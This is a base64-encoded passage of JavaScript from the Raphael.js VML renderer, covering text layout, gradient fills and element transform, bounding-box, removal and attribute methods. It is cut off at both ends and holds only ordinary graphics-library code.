ICAgICAgICAgIG0gPSAxMDAsXG4gICAgICAgICAgICAgICAgZm9udFNpemUgPSBhLmZvbnQgJiYgYS5mb250Lm1hdGNoKC9cXGQrKD86XFwuXFxkKik/KD89cHgpLyk7XG4gICAgICAgICAgICBzID0gc3Bhbi5zdHlsZTtcbiAgICAgICAgICAgIGEuZm9udCAmJiAocy5mb250ID0gYS5mb250KTtcbiAgICAgICAgICAgIGFbXCJmb250LWZhbWlseVwiXSAmJiAocy5mb250RmFtaWx5ID0gYVtcImZvbnQtZmFtaWx5XCJdKTtcbiAgICAgICAgICAgIGFbXCJmb250LXdlaWdodFwiXSAmJiAocy5mb250V2VpZ2h0ID0gYVtcImZvbnQtd2VpZ2h0XCJdKTtcbiAgICAgICAgICAgIGFbXCJmb250LXN0eWxlXCJdICYmIChzLmZvbnRTdHlsZSA9IGFbXCJmb250LXN0eWxlXCJdKTtcbiAgICAgICAgICAgIGZvbnRTaXplID0gdG9GbG9hdChhW1wiZm9udC1zaXplXCJdIHx8IGZvbnRTaXplICYmIGZvbnRTaXplWzBdKSB8fCAxMDtcbiAgICAgICAgICAgIHMuZm9udFNpemUgPSBmb250U2l6ZSAqIG0gKyBcInB4XCI7XG4gICAgICAgICAgICByZXMudGV4dHBhdGguc3RyaW5nICYmIChzcGFuLmlubmVySFRNTCA9IFN0cihyZXMudGV4dHBhdGguc3RyaW5nKS5yZXBsYWNlKC88L2csIFwiJiM2MDtcIikucmVwbGFjZSgvJi9nLCBcIiYjMzg7XCIpLnJlcGxhY2UoL1xcbi9nLCBcIjxicj5cIikpO1xuICAgICAgICAgICAgdmFyIGJyZWN0ID0gc3Bhbi5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKTtcbiAgICAgICAgICAgIHJlcy5XID0gYS53ID0gKGJyZWN0LnJpZ2h0IC0gYnJlY3QubGVmdCkgLyBtO1xuICAgICAgICAgICAgcmVzLkggPSBhLmggPSAoYnJlY3QuYm90dG9tIC0gYnJlY3QudG9wKSAvIG07XG4gICAgICAgICAgICAvLyByZXMucGFwZXIuY2FudmFzLnN0eWxlLmRpc3BsYXkgPSBcIm5vbmVcIjtcbiAgICAgICAgICAgIHJlcy5YID0gYS54O1xuICAgICAgICAgICAgcmVzLlkgPSBhLnkgKyByZXMuSCAvIDI7XG5cbiAgICAgICAgICAgIChcInhcIiBpbiBwYXJhbXMgfHwgXCJ5XCIgaW4gcGFyYW1zKSAmJiAocmVzLnBhdGgudiA9IFIuZm9ybWF0KFwibXswfSx7MX1sezJ9LHsxfVwiLCByb3VuZChhLnggKiB6b29tKSwgcm91bmQoYS55ICogem9vbSksIHJvdW5kKGEueCAqIHpvb20pICsgMSkpO1xuICAgICAgICAgICAgdmFyIGRpcnR5YXR0cnMgPSBbXCJ4XCIsIFwieVwiLCBcInRleHRcIiwgXCJmb250XCIsIFwiZm9udC1mYW1pbHlcIiwgXCJmb250LXdlaWdodFwiLCBcImZvbnQtc3R5bGVcIiwgXCJmb250LXNpemVcIl07XG4gICAgICAgICAgICBmb3IgKHZhciBkID0gMCwgZGQgPSBkaXJ0eWF0dHJzLmxlbmd0aDsgZCA8IGRkOyBkKyspIGlmIChkaXJ0eWF0dHJzW2RdIGluIHBhcmFtcykge1xuICAgICAgICAgICAgICAgIHJlcy5fLmRpcnR5ID0gMTtcbiAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgLy8gdGV4dC1hbmNob3IgZW11bGF0aW9uXG4gICAgICAgICAgICBzd2l0Y2ggKGFbXCJ0ZXh0LWFuY2hvclwiXSkge1xuICAgICAgICAgICAgICAgIGNhc2UgXCJzdGFydFwiOlxuICAgICAgICAgICAgICAgICAgICByZXMudGV4dHBhdGguc3R5bGVbXCJ2LXRleHQtYWxpZ25cIl0gPSBcImxlZnRcIjtcbiAgICAgICAgICAgICAgICAgICAgcmVzLmJieCA9IHJlcy5XIC8gMjtcbiAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIFwiZW5kXCI6XG4gICAgICAgICAgICAgICAgICAgIHJlcy50ZXh0cGF0aC5zdHlsZVtcInYtdGV4dC1hbGlnblwiXSA9IFwicmlnaHRcIjtcbiAgICAgICAgICAgICAgICAgICAgcmVzLmJieCA9IC1yZXMuVyAvIDI7XG4gICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICAgICAgcmVzLnRleHRwYXRoLnN0eWxlW1widi10ZXh0LWFsaWduXCJdID0gXCJjZW50ZXJcIjtcbiAgICAgICAgICAgICAgICAgICAgcmVzLmJieCA9IDA7XG4gICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXMudGV4dHBhdGguc3R5bGVbXCJ2LXRleHQta2VyblwiXSA9IHRydWU7XG4gICAgICAgIH1cbiAgICAgICAgLy8gcmVzLnBhcGVyLmNhbnZhcy5zdHlsZS5kaXNwbGF5ID0gRTtcbiAgICB9LFxuICAgIGFkZEdyYWRpZW50RmlsbCA9IGZ1bmN0aW9uIChvLCBncmFkaWVudCwgZmlsbCkge1xuICAgICAgICBvLmF0dHJzID0gby5hdHRycyB8fCB7fTtcbiAgICAgICAgdmFyIGF0dHJzID0gby5hdHRycyxcbiAgICAgICAgICAgIHBvdyA9IE1hdGgucG93LFxuICAgICAgICAgICAgb3BhY2l0eSxcbiAgICAgICAgICAgIG9pbmRleCxcbiAgICAgICAgICAgIHR5cGUgPSBcImxpbmVhclwiLFxuICAgICAgICAgICAgZnhmeSA9IFwiLjUgLjVcIjtcbiAgICAgICAgby5hdHRycy5ncmFkaWVudCA9IGdyYWRpZW50O1xuICAgICAgICBncmFkaWVudCA9IFN0cihncmFkaWVudCkucmVwbGFjZShSLl9yYWRpYWxfZ3JhZGllbnQsIGZ1bmN0aW9uIChhbGwsIGZ4LCBmeSkge1xuICAgICAgICAgICAgdHlwZSA9IFwicmFkaWFsXCI7XG4gICAgICAgICAgICBpZiAoZnggJiYgZnkpIHtcbiAgICAgICAgICAgICAgICBmeCA9IHRvRmxvYXQoZngpO1xuICAgICAgICAgICAgICAgIGZ5ID0gdG9GbG9hdChmeSk7XG4gICAgICAgICAgICAgICAgcG93KGZ4IC0gLjUsIDIpICsgcG93KGZ5IC0gLjUsIDIpID4gLjI1ICYmIChmeSA9IG1hdGguc3FydCguMjUgLSBwb3coZnggLSAuNSwgMikpICogKChmeSA+IC41KSAqIDIgLSAxKSArIC41KTtcbiAgICAgICAgICAgICAgICBmeGZ5ID0gZnggKyBTICsgZnk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gRTtcbiAgICAgICAgfSk7XG4gICAgICAgIGdyYWRpZW50ID0gZ3JhZGllbnQuc3BsaXQoL1xccypcXC1cXHMqLyk7XG4gICAgICAgIGlmICh0eXBlID09IFwibGluZWFyXCIpIHtcbiAgICAgICAgICAgIHZhciBhbmdsZSA9IGdyYWRpZW50LnNoaWZ0KCk7XG4gICAgICAgICAgICBhbmdsZSA9IC10b0Zsb2F0KGFuZ2xlKTtcbiAgICAgICAgICAgIGlmIChpc05hTihhbmdsZSkpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICB2YXIgZG90cyA9IFIuX3BhcnNlRG90cyhncmFkaWVudCk7XG4gICAgICAgIGlmICghZG90cykge1xuICAgICAgICAgICAgcmV0dXJuIG51bGw7XG4gICAgICAgIH1cbiAgICAgICAgbyA9IG8uc2hhcGUgfHwgby5ub2RlO1xuICAgICAgICBpZiAoZG90cy5sZW5ndGgpIHtcbiAgICAgICAgICAgIG8ucmVtb3ZlQ2hpbGQoZmlsbCk7XG4gICAgICAgICAgICBmaWxsLm9uID0gdHJ1ZTtcbiAgICAgICAgICAgIGZpbGwubWV0aG9kID0gXCJub25lXCI7XG4gICAgICAgICAgICBmaWxsLmNvbG9yID0gZG90c1swXS5jb2xvcjtcbiAgICAgICAgICAgIGZpbGwuY29sb3IyID0gZG90c1tkb3RzLmxlbmd0aCAtIDFdLmNvbG9yO1xuICAgICAgICAgICAgdmFyIGNscnMgPSBbXTtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IGRvdHMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgIGRvdHNbaV0ub2Zmc2V0ICYmIGNscnMucHVzaChkb3RzW2ldLm9mZnNldCArIFMgKyBkb3RzW2ldLmNvbG9yKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGZpbGwuY29sb3JzID0gY2xycy5sZW5ndGggPyBjbHJzLmpvaW4oKSA6IFwiMCUgXCIgKyBmaWxsLmNvbG9yO1xuICAgICAgICAgICAgaWYgKHR5cGUgPT0gXCJyYWRpYWxcIikge1xuICAgICAgICAgICAgICAgIGZpbGwudHlwZSA9IFwiZ3JhZGllbnRUaXRsZVwiO1xuICAgICAgICAgICAgICAgIGZpbGwuZm9jdXMgPSBcIjEwMCVcIjtcbiAgICAgICAgICAgICAgICBmaWxsLmZvY3Vzc2l6ZSA9IFwiMCAwXCI7XG4gICAgICAgICAgICAgICAgZmlsbC5mb2N1c3Bvc2l0aW9uID0gZnhmeTtcbiAgICAgICAgICAgICAgICBmaWxsLmFuZ2xlID0gMDtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgLy8gZmlsbC5yb3RhdGU9IHRydWU7XG4gICAgICAgICAgICAgICAgZmlsbC50eXBlID0gXCJncmFkaWVudFwiO1xuICAgICAgICAgICAgICAgIGZpbGwuYW5nbGUgPSAoMjcwIC0gYW5nbGUpICUgMzYwO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgby5hcHBlbmRDaGlsZChmaWxsKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gMTtcbiAgICB9LFxuICAgIEVsZW1lbnQgPSBmdW5jdGlvbiAobm9kZSwgdm1sKSB7XG4gICAgICAgIHRoaXNbMF0gPSB0aGlzLm5vZGUgPSBub2RlO1xuICAgICAgICBub2RlLnJhcGhhZWwgPSB0cnVlO1xuICAgICAgICB0aGlzLmlkID0gUi5fb2lkKys7XG4gICAgICAgIG5vZGUucmFwaGFlbGlkID0gdGhpcy5pZDtcbiAgICAgICAgdGhpcy5YID0gMDtcbiAgICAgICAgdGhpcy5ZID0gMDtcbiAgICAgICAgdGhpcy5hdHRycyA9IHt9O1xuICAgICAgICB0aGlzLnBhcGVyID0gdm1sO1xuICAgICAgICB0aGlzLm1hdHJpeCA9IFIubWF0cml4KCk7XG4gICAgICAgIHRoaXMuXyA9IHtcbiAgICAgICAgICAgIHRyYW5zZm9ybTogW10sXG4gICAgICAgICAgICBzeDogMSxcbiAgICAgICAgICAgIHN5OiAxLFxuICAgICAgICAgICAgZHg6IDAsXG4gICAgICAgICAgICBkeTogMCxcbiAgICAgICAgICAgIGRlZzogMCxcbiAgICAgICAgICAgIGRpcnR5OiAxLFxuICAgICAgICAgICAgZGlydHlUOiAxXG4gICAgICAgIH07XG4gICAgICAgICF2bWwuYm90dG9tICYmICh2bWwuYm90dG9tID0gdGhpcyk7XG4gICAgICAgIHRoaXMucHJldiA9IHZtbC50b3A7XG4gICAgICAgIHZtbC50b3AgJiYgKHZtbC50b3AubmV4dCA9IHRoaXMpO1xuICAgICAgICB2bWwudG9wID0gdGhpcztcbiAgICAgICAgdGhpcy5uZXh0ID0gbnVsbDtcbiAgICB9O1xuICAgIHZhciBlbHByb3RvID0gUi5lbDtcblxuICAgIEVsZW1lbnQucHJvdG90eXBlID0gZWxwcm90bztcbiAgICBlbHByb3RvLmNvbnN0cnVjdG9yID0gRWxlbWVudDtcbiAgICBlbHByb3RvLnRyYW5zZm9ybSA9IGZ1bmN0aW9uICh0c3RyKSB7XG4gICAgICAgIGlmICh0c3RyID09IG51bGwpIHtcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl8udHJhbnNmb3JtO1xuICAgICAgICB9XG4gICAgICAgIHZhciB2YnMgPSB0aGlzLnBhcGVyLl92aWV3Qm94U2hpZnQsXG4gICAgICAgICAgICB2YnQgPSB2YnMgPyBcInNcIiArIFt2YnMuc2NhbGUsIHZicy5zY2FsZV0gKyBcIi0xLTF0XCIgKyBbdmJzLmR4LCB2YnMuZHldIDogRSxcbiAgICAgICAgICAgIG9sZHQ7XG4gICAgICAgIGlmICh2YnMpIHtcbiAgICAgICAgICAgIG9sZHQgPSB0c3RyID0gU3RyKHRzdHIpLnJlcGxhY2UoL1xcLnszfXxcXHUyMDI2L2csIHRoaXMuXy50cmFuc2Zvcm0gfHwgRSk7XG4gICAgICAgIH1cbiAgICAgICAgUi5fZXh0cmFjdFRyYW5zZm9ybSh0aGlzLCB2YnQgKyB0c3RyKTtcbiAgICAgICAgdmFyIG1hdHJpeCA9IHRoaXMubWF0cml4LmNsb25lKCksXG4gICAgICAgICAgICBza2V3ID0gdGhpcy5za2V3LFxuICAgICAgICAgICAgbyA9IHRoaXMubm9kZSxcbiAgICAgICAgICAgIHNwbGl0LFxuICAgICAgICAgICAgaXNHcmFkID0gflN0cih0aGlzLmF0dHJzLmZpbGwpLmluZGV4T2YoXCItXCIpLFxuICAgICAgICAgICAgaXNQYXR0ID0gIVN0cih0aGlzLmF0dHJzLmZpbGwpLmluZGV4T2YoXCJ1cmwoXCIpO1xuICAgICAgICBtYXRyaXgudHJhbnNsYXRlKDEsIDEpO1xuICAgICAgICBpZiAoaXNQYXR0IHx8IGlzR3JhZCB8fCB0aGlzLnR5cGUgPT0gXCJpbWFnZVwiKSB7XG4gICAgICAgICAgICBza2V3Lm1hdHJpeCA9IFwiMSAwIDAgMVwiO1xuICAgICAgICAgICAgc2tldy5vZmZzZXQgPSBcIjAgMFwiO1xuICAgICAgICAgICAgc3BsaXQgPSBtYXRyaXguc3BsaXQoKTtcbiAgICAgICAgICAgIGlmICgoaXNHcmFkICYmIHNwbGl0Lm5vUm90YXRpb24pIHx8ICFzcGxpdC5pc1NpbXBsZSkge1xuICAgICAgICAgICAgICAgIG8uc3R5bGUuZmlsdGVyID0gbWF0cml4LnRvRmlsdGVyKCk7XG4gICAgICAgICAgICAgICAgdmFyIGJiID0gdGhpcy5nZXRCQm94KCksXG4gICAgICAgICAgICAgICAgICAgIGJidCA9IHRoaXMuZ2V0QkJveCgxKSxcbiAgICAgICAgICAgICAgICAgICAgZHggPSBiYi54IC0gYmJ0LngsXG4gICAgICAgICAgICAgICAgICAgIGR5ID0gYmIueSAtIGJidC55O1xuICAgICAgICAgICAgICAgIG8uY29vcmRvcmlnaW4gPSAoZHggKiAtem9vbSkgKyBTICsgKGR5ICogLXpvb20pO1xuICAgICAgICAgICAgICAgIHNldENvb3Jkcyh0aGlzLCAxLCAxLCBkeCwgZHksIDApO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBvLnN0eWxlLmZpbHRlciA9IEU7XG4gICAgICAgICAgICAgICAgc2V0Q29vcmRzKHRoaXMsIHNwbGl0LnNjYWxleCwgc3BsaXQuc2NhbGV5LCBzcGxpdC5keCwgc3BsaXQuZHksIHNwbGl0LnJvdGF0ZSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBvLnN0eWxlLmZpbHRlciA9IEU7XG4gICAgICAgICAgICBza2V3Lm1hdHJpeCA9IFN0cihtYXRyaXgpO1xuICAgICAgICAgICAgc2tldy5vZmZzZXQgPSBtYXRyaXgub2Zmc2V0KCk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKG9sZHQgIT09IG51bGwpIHsgLy8gZW1wdHkgc3RyaW5nIHZhbHVlIGlzIHRydWUgYXMgd2VsbFxuICAgICAgICAgICAgdGhpcy5fLnRyYW5zZm9ybSA9IG9sZHQ7XG4gICAgICAgICAgICBSLl9leHRyYWN0VHJhbnNmb3JtKHRoaXMsIG9sZHQpO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiB0aGlzO1xuICAgIH07XG4gICAgZWxwcm90by5yb3RhdGUgPSBmdW5jdGlvbiAoZGVnLCBjeCwgY3kpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGRlZyA9PSBudWxsKSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgICAgZGVnID0gU3RyKGRlZykuc3BsaXQoc2VwYXJhdG9yKTtcbiAgICAgICAgaWYgKGRlZy5sZW5ndGggLSAxKSB7XG4gICAgICAgICAgICBjeCA9IHRvRmxvYXQoZGVnWzFdKTtcbiAgICAgICAgICAgIGN5ID0gdG9GbG9hdChkZWdbMl0pO1xuICAgICAgICB9XG4gICAgICAgIGRlZyA9IHRvRmxvYXQoZGVnWzBdKTtcbiAgICAgICAgKGN5ID09IG51bGwpICYmIChjeCA9IGN5KTtcbiAgICAgICAgaWYgKGN4ID09IG51bGwgfHwgY3kgPT0gbnVsbCkge1xuICAgICAgICAgICAgdmFyIGJib3ggPSB0aGlzLmdldEJCb3goMSk7XG4gICAgICAgICAgICBjeCA9IGJib3gueCArIGJib3gud2lkdGggLyAyO1xuICAgICAgICAgICAgY3kgPSBiYm94LnkgKyBiYm94LmhlaWdodCAvIDI7XG4gICAgICAgIH1cbiAgICAgICAgdGhpcy5fLmRpcnR5VCA9IDE7XG4gICAgICAgIHRoaXMudHJhbnNmb3JtKHRoaXMuXy50cmFuc2Zvcm0uY29uY2F0KFtbXCJyXCIsIGRlZywgY3gsIGN5XV0pKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLnRyYW5zbGF0ZSA9IGZ1bmN0aW9uIChkeCwgZHkpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgZHggPSBTdHIoZHgpLnNwbGl0KHNlcGFyYXRvcik7XG4gICAgICAgIGlmIChkeC5sZW5ndGggLSAxKSB7XG4gICAgICAgICAgICBkeSA9IHRvRmxvYXQoZHhbMV0pO1xuICAgICAgICB9XG4gICAgICAgIGR4ID0gdG9GbG9hdChkeFswXSkgfHwgMDtcbiAgICAgICAgZHkgPSArZHkgfHwgMDtcbiAgICAgICAgaWYgKHRoaXMuXy5iYm94KSB7XG4gICAgICAgICAgICB0aGlzLl8uYmJveC54ICs9IGR4O1xuICAgICAgICAgICAgdGhpcy5fLmJib3gueSArPSBkeTtcbiAgICAgICAgfVxuICAgICAgICB0aGlzLnRyYW5zZm9ybSh0aGlzLl8udHJhbnNmb3JtLmNvbmNhdChbW1widFwiLCBkeCwgZHldXSkpO1xuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuICAgIGVscHJvdG8uc2NhbGUgPSBmdW5jdGlvbiAoc3gsIHN5LCBjeCwgY3kpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgc3ggPSBTdHIoc3gpLnNwbGl0KHNlcGFyYXRvcik7XG4gICAgICAgIGlmIChzeC5sZW5ndGggLSAxKSB7XG4gICAgICAgICAgICBzeSA9IHRvRmxvYXQoc3hbMV0pO1xuICAgICAgICAgICAgY3ggPSB0b0Zsb2F0KHN4WzJdKTtcbiAgICAgICAgICAgIGN5ID0gdG9GbG9hdChzeFszXSk7XG4gICAgICAgICAgICBpc05hTihjeCkgJiYgKGN4ID0gbnVsbCk7XG4gICAgICAgICAgICBpc05hTihjeSkgJiYgKGN5ID0gbnVsbCk7XG4gICAgICAgIH1cbiAgICAgICAgc3ggPSB0b0Zsb2F0KHN4WzBdKTtcbiAgICAgICAgKHN5ID09IG51bGwpICYmIChzeSA9IHN4KTtcbiAgICAgICAgKGN5ID09IG51bGwpICYmIChjeCA9IGN5KTtcbiAgICAgICAgaWYgKGN4ID09IG51bGwgfHwgY3kgPT0gbnVsbCkge1xuICAgICAgICAgICAgdmFyIGJib3ggPSB0aGlzLmdldEJCb3goMSk7XG4gICAgICAgIH1cbiAgICAgICAgY3ggPSBjeCA9PSBudWxsID8gYmJveC54ICsgYmJveC53aWR0aCAvIDIgOiBjeDtcbiAgICAgICAgY3kgPSBjeSA9PSBudWxsID8gYmJveC55ICsgYmJveC5oZWlnaHQgLyAyIDogY3k7XG5cbiAgICAgICAgdGhpcy50cmFuc2Zvcm0odGhpcy5fLnRyYW5zZm9ybS5jb25jYXQoW1tcInNcIiwgc3gsIHN5LCBjeCwgY3ldXSkpO1xuICAgICAgICB0aGlzLl8uZGlydHlUID0gMTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICBlbHByb3RvLmhpZGUgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICF0aGlzLnJlbW92ZWQgJiYgKHRoaXMubm9kZS5zdHlsZS5kaXNwbGF5ID0gXCJub25lXCIpO1xuICAgICAgICByZXR1cm4gdGhpcztcbiAgICB9O1xuICAgIGVscHJvdG8uc2hvdyA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgIXRoaXMucmVtb3ZlZCAmJiAodGhpcy5ub2RlLnN0eWxlLmRpc3BsYXkgPSBFKTtcbiAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgfTtcbiAgICAvLyBOZWVkZWQgdG8gZml4IHRoZSB2bWwgc2V0Vmlld0JveCBpc3N1ZXNcbiAgICBlbHByb3RvLmF1eEdldEJCb3ggPSBSLmVsLmdldEJCb3g7XG4gICAgZWxwcm90by5nZXRCQm94ID0gZnVuY3Rpb24oKXtcbiAgICAgIHZhciBiID0gdGhpcy5hdXhHZXRCQm94KCk7XG4gICAgICBpZiAodGhpcy5wYXBlciAmJiB0aGlzLnBhcGVyLl92aWV3Qm94U2hpZnQpXG4gICAgICB7XG4gICAgICAgIHZhciBjID0ge307XG4gICAgICAgIHZhciB6ID0gMS90aGlzLnBhcGVyLl92aWV3Qm94U2hpZnQuc2NhbGU7XG4gICAgICAgIGMueCA9IGIueCAtIHRoaXMucGFwZXIuX3ZpZXdCb3hTaGlmdC5keDtcbiAgICAgICAgYy54ICo9IHo7XG4gICAgICAgIGMueSA9IGIueSAtIHRoaXMucGFwZXIuX3ZpZXdCb3hTaGlmdC5keTtcbiAgICAgICAgYy55ICo9IHo7XG4gICAgICAgIGMud2lkdGggID0gYi53aWR0aCAgKiB6O1xuICAgICAgICBjLmhlaWdodCA9IGIuaGVpZ2h0ICogejtcbiAgICAgICAgYy54MiA9IGMueCArIGMud2lkdGg7XG4gICAgICAgIGMueTIgPSBjLnkgKyBjLmhlaWdodDtcbiAgICAgICAgcmV0dXJuIGM7XG4gICAgICB9XG4gICAgICByZXR1cm4gYjtcbiAgICB9O1xuICAgIGVscHJvdG8uX2dldEJCb3ggPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQpIHtcbiAgICAgICAgICAgIHJldHVybiB7fTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4ge1xuICAgICAgICAgICAgeDogdGhpcy5YICsgKHRoaXMuYmJ4IHx8IDApIC0gdGhpcy5XIC8gMixcbiAgICAgICAgICAgIHk6IHRoaXMuWSAtIHRoaXMuSCxcbiAgICAgICAgICAgIHdpZHRoOiB0aGlzLlcsXG4gICAgICAgICAgICBoZWlnaHQ6IHRoaXMuSFxuICAgICAgICB9O1xuICAgIH07XG4gICAgZWxwcm90by5yZW1vdmUgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIGlmICh0aGlzLnJlbW92ZWQgfHwgIXRoaXMubm9kZS5wYXJlbnROb2RlKSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgICAgdGhpcy5wYXBlci5fX3NldF9fICYmIHRoaXMucGFwZXIuX19zZXRfXy5leGNsdWRlKHRoaXMpO1xuICAgICAgICBSLmV2ZS51bmJpbmQoXCJyYXBoYWVsLiouKi5cIiArIHRoaXMuaWQpO1xuICAgICAgICBSLl90ZWFyKHRoaXMsIHRoaXMucGFwZXIpO1xuICAgICAgICB0aGlzLm5vZGUucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0aGlzLm5vZGUpO1xuICAgICAgICB0aGlzLnNoYXBlICYmIHRoaXMuc2hhcGUucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0aGlzLnNoYXBlKTtcbiAgICAgICAgZm9yICh2YXIgaSBpbiB0aGlzKSB7XG4gICAgICAgICAgICB0aGlzW2ldID0gdHlwZW9mIHRoaXNbaV0gPT0gXCJmdW5jdGlvblwiID8gUi5fcmVtb3ZlZEZhY3RvcnkoaSkgOiBudWxsO1xuICAgICAgICB9XG4gICAgICAgIHRoaXMucmVtb3ZlZCA9IHRydWU7XG4gICAgfTtcbiAgICBlbHByb3RvLmF0dHIgPSBmdW5jdGlvbiAobmFtZSwgdmFsdWUpIHtcbiAgICAgICAgaWYgKHRoaXMucmVtb3ZlZCkge1xuICAgICAgICAgICAgcmV0dXJuIHRoaXM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKG5hbWUgPT0gbnVsbCkge1xuICAgICAgICAgICAgdmFyIHJlcyA9IHt9O1xuICAgICAgICAgICAgZm9yICh2YXIgYSBpbiB0aGlzLmF0dHJzKSBpZiAodGhpcy5hdHRyc1toYXNdKGEpKSB7XG4gICAgICAgICAgICAgICAgcmVzW2FdID0gdGhpcy5hdHRyc1thXTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlcy5ncmFkaWVudCAmJiByZXMuZmlsbCA9PSBcIm5vbmVcIiAmJiAocmVzLmZpbGwgPSByZXMuZ3JhZGllbnQpICYmIGRlbGV0ZSByZXMuZ3JhZGllbnQ7XG4gICAgICAgICAgICByZXMudHJhbnNmb3JtID0gdGhpcy5fLnRyYW5zZm9ybTtcbiAgICAgICAgICAgIHJldHVybiByZXM7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHZhbHVlID09IG51bGwgJiYgUi5pcyhuYW1lLCBcInN0cmluZ1wiKSkge1xuICAgICAgICAgICAgaWYgKG5hbWUgPT0gZmlsbFN0cmluZyAmJiB0aGlzLmF0dHJzLmZpbGwgPT0gXCJub25lXCIgJiYgdGhpcy5hdHRycy5ncmFkaWVudCkge1xuICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLmF0dHJzLmdyYWRpZW50O1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmFyIG5hbWVzID0gbmFtZS5zcGxpdChzZXBhcmF0b3IpLFxuICAgICAgICAgICAgICAgIG91dCA9IHt9O1xuICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gbmFtZXMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgIG5hbWUgPSBuYW1lc1tpXTtcbiAgICAgICAgICAgICAgICBpZiAobmFtZSBpbiB0aGlzLmF0dHJzKSB7XG4gICAgICAgICAgICAgICAgICAgIG91dFtuYW1lXSA9IHRoaXMuYXR0cnNbbmFtZV07XG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmIChSLmlzKHRoaXMucGFwZXIuY3VzdG9tQXR0cmlidXRlc1tuYW1lXSwgXCJmdW5jdGlvblwiKSkge1xuICAgICAgICAgICAgICAgICAgICBvdXRbbmFtZV0gPSB0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbbmFtZV0uZGVmO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIG91dFtuYW1lXSA9IFIuX2F2YWlsYWJsZUF0dHJzW25hbWVdO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybiBpaSAtIDEgPyBvdXQgOiBvdXRbbmFtZXNbMF1dO1xuICAgICAgICB9XG4gICAgICAgIGlmICh0aGlzLmF0dHJzICYmIHZhbHVlID09IG51bGwgJiYgUi5pcyhuYW1lLCBcImFycmF5XCIpKSB7XG4gICAgICAgICAgICBvdXQgPSB7fTtcbiAgICAgICAgICAgIGZvciAoaSA9IDAsIGlpID0gbmFtZS5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgb3V0W25hbWVbaV1dID0gdGhpcy5hdHRyKG5hbWVbaV0pO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIG91dDtcbiAgICAgICAgfVxuICAgICAgICB2YXIgcGFyYW1zO1xuICAgICAgICBpZiAodmFsdWUgIT0gbnVsbCkge1xuICAgICAgICAgICAgcGFyYW1zID0ge307XG4gICAgICAgICAgICBwYXJhbXNbbmFtZV0gPSB2YWx1ZTtcbiAgICAgICAgfVxuICAgICAgICB2YWx1ZSA9PSBudWxsICYmIFIuaXMobmFtZSwgXCJvYmplY3RcIikgJiYgKHBhcmFtcyA9IG5hbWUpO1xuICAgICAgICBmb3IgKHZhciBrZXkgaW4gcGFyYW1zKSB7XG4gICAgICAgICAgICBldmUoXCJyYXBoYWVsLmF0dHIuXCIgKyBrZXkgKyBcIi5cIiArIHRoaXMuaWQsIHRoaXMsIHBhcmFtc1trZXldKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAocGFyYW1zKSB7XG4gICAgICAgICAgICBmb3IgKGtleSBpbiB0aGlzLnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXMp